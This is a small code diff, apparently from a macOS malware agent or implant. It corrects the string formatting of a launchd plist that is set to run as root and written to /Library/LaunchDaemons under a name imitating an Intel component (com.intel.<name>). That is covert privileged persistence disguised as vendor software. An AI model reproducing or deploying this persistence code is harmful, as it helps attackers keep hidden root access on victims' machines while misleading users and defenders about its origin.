@@ -213,7 +213,7 @@ class Agent(object):
                 <string>root</string>
             </dict>
             </plist>
-            """ % (self.rootPachName)
+            """ % (self.rootPachName,self.rootPachName,self.rootPachName)
             persist_filename = '/Library/LaunchDaemons/com.intel.%s.plist' % (self.rootPachName)
             with open(persist_filename, 'w') as file_object:
                 file_object.write(comIntelPlist)
